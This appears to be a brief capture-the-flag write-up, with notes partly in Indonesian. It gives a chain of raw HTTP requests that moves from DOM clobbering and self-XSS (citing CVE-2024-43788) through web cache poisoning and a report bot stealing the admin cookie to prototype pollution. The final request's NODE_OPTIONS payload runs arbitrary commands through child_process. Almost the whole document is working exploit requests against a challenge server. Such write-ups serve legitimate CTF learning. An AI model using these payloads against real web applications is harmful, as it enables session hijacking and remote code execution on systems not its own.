# TLDR
nanti aing update full wu nya, sekarang gini dulu
1. DOM Clobbering to Self XSS using CVE-2024-43788
2. Web Cache Poisoning
3. Prototype Pollution to RCE

## POC

1. register

```http
POST /register HTTP/1.1
Host: 103.185.44.93:30001
Content-Length: 21
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://103.185.44.93:30001
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://103.185.44.93:30001/register
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=a&password=a
```

2. login
   
```http
POST /login HTTP/1.1
Host: 103.185.44.93:30001
Content-Length: 21
Pragma: no-cache
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://103.185.44.93:30001
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://103.185.44.93:30001/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=a&password=a
```

3. update profile to insert clobbering payload

```http
POST /profile HTTP/1.1
Host: 103.185.44.93:30001
Content-Length: 76
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://103.185.44.93:30001
Referer: http://103.185.44.93:30001/profile
Accept-Encoding: gzip, deflate, br
Cookie: session=user_session_jwt
Connection: keep-alive

{"profile_pic":"http://103.185.44.93/\" name=\"currentScript\" belugaishere=\"yey"}
```

4. Trigger the dom clobbering and cache poisoning

```http
GET /profile HTTP/1.1
Host: 103.185.44.93:30001
Pragma: no-cache
Cache-Control: no-cache
X-Forwarded-For: ::ffff:127.0.0.1
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://103.185.44.93:30001/home
Accept-Encoding: gzip, deflate, br
Cookie: session=ur_session
Connection: keep-alive


```

5. Get admin cookie by accessing the /profile with polluted response

```http
POST /report HTTP/1.1
Host: 103.185.44.93:30001
Content-Length: 33
Pragma: no-cache
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://103.185.44.93:30001
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://103.185.44.93:30001/report
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

url=http://127.0.0.1:3000/profile
```

6. After obtaining the cookie, we can trigger the code execution via prototype pollution

```http
POST /manage/1 HTTP/1.1
Host: 103.185.44.93:30001
Content-Length: 377
Pragma: no-cache
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://103.185.44.93:30001
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://103.185.44.93:30001/manage/1
Accept-Encoding: gzip, deflate, br
Cookie: session=ur_session
Connection: keep-alive

username=b&profile_pic=https%3A%2F%2Favatar.iran.liara.run%2Fpublic&password=bb&constructor[prototype][NODE_OPTIONS]=--import="data:text/javascript,import child_process from 'node:child_process';child_process.exec('your system command here')"
```

7. Shell obtained. Enjoy your flag



## References
https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986

https://portswigger.net/research/exploiting-prototype-pollution-in-node-without-the-filesystem

https://www.hackthebox.com/blog/business-ctf-2022-felonious-forums-write-up